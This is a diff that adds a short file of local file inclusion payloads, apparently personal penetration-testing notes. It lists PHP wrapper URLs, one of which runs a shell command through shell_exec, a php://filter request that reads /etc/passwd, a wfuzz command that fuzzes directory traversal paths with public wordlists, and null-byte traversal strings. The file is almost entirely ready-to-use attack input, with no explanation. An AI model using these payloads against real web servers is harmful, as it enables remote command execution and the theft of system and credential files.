@@ -1,0 +1,14 @@
+#PHP WRAPPERS
+http://192.168.112.132/menu.php?file=data:text/plain,helloworld #IDENTIFY
+http://192.168.112.132/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+#TESTING
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
+
+#NULL BYTE INJECTION
+http://website/page=../../../etc/passwd%00
+http://example.com/page=../../../../../../etc/passwd?
+/etc/passwd%00jpg     
